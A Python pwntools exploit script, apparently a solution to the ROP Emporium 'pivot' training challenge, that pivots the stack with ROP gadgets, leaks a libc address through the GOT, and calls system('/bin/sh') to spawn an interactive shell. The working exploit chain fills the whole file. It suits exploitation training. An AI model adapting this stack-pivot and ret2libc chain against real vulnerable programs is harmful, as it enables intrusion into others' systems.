#!/usr/bin/env python3
from pwn import *
import binascii

"""
This is the same as sploit.py except it executes a shell. This relies on
needing to do a double-pivot after exploitation. There is very likely
a more elegant way t do this. Sorry for the unclean code but this one
was bonus time.
"""


context.terminal = ["tmux", "splitw", "-h"]

# System offset
# system - 0044fa60
# puts - 004809d0
system_offset = 0x30f70

# puts .got.plt location
puts_got = p64(0x0601020)

# Foothold function PLT address.
foothold_func = p64(0x00400720)

# Foothold function .got.plt address
# We will leak this value, then use it to calculate
# the address of the pwnme function.
foothold_got = p64(0x00601040)

# Puts plt function. We'll use this to leak or pointer to
# foothold_funcion.
puts_func = p64(0x004006e0)

# The address of main. We'll need this to send in more data for stage 2
main_address = p64(0x00400847)

# A few provided gadgets.
# Pop rax is needed for the xchg function.
pop_rax = p64(0x004009bb)
xchg = p64(0x004009bd)

# Generally useful gadget
pop_rdi = p64(0x00400a33)
ret = p64(0x004009c7)
gen = cyclic_gen()
data = gen.get(40)

# This is the offset between ret2win and the foothold function.
ret2win_offset = 0x117

p = process("./pivot")
#continue
#""")

# Get the pointer to the large buffer we can write to.
p.readuntilS("pivot: ")
big_buffer = p.readlineS().strip()
print(f"We can place our larger ropchain inside of: '{big_buffer}'")
big_buffer = p64(int(big_buffer, 16))

"""
Stage 1. in this stage, we'll run through the PLT, and populate the GOT 
so we can calculate the address of our pwn2win function.
"""
# Filler
small_data = data
# Put our pointer into RAX
small_data += pop_rax
small_data += big_buffer
# Make our pointer the new stack pointer the chain will continue from there
small_data += xchg

# Run through the foothold function to establish its address
# in libpivot.so
big_data = b""
big_data += ret
#big_data += foothold_func
# Leak out the address of foothold function
big_data += pop_rdi
big_data += puts_got
# Print out the address of the puts function
big_data += puts_func
# There is an extra new line that we need to consume
big_data += main_address # Go back to main 


print("s1 small_data: " + small_data.hex())
print("s1 big_data: " + big_data.hex())
# Send in Stage 1
print("s1: " + p.readuntilS(b"> "))
p.send(big_data)

print("s1: " + p.readuntilS(b"> "))
p.send(small_data)

# Get our leaked address from puts
print("s2: " + p.readlineS().strip())
puts_addr = p.readline().strip()
print(puts_addr)
puts_addr = int.from_bytes(puts_addr, 'little', signed=False)

system_address = puts_addr - system_offset
print(f"s2: Pivot Addr: {hex(puts_addr)}")
print(f"s2: system_address address: {hex(system_address)}")

p.readuntil(b"pivot: ")
new_buffer = p.readlineS().strip()
print("s2: new buffer: " + new_buffer)
new_buffer = p64(int(new_buffer, 16))

"""
Stage 2
"""

# Filler
small_data = b""
small_data += data
# Put our pointer into RAX
small_data += pop_rax
#small_data += p64(0x41414141)
small_data += new_buffer
# Make our pointer the new stack pointer the chain will continue from there
small_data += xchg


big_data = b""
#big_data += ret
big_data += pop_rdi
big_data += p64(u64(new_buffer) + 24)
big_data += p64(system_address)
big_data += b"/bin/sh"

print("s2: " + p.readuntilS("> "))
p.send(big_data)
print("s2: " + p.readuntilS("> "))
p.send(small_data)
p.interactive()
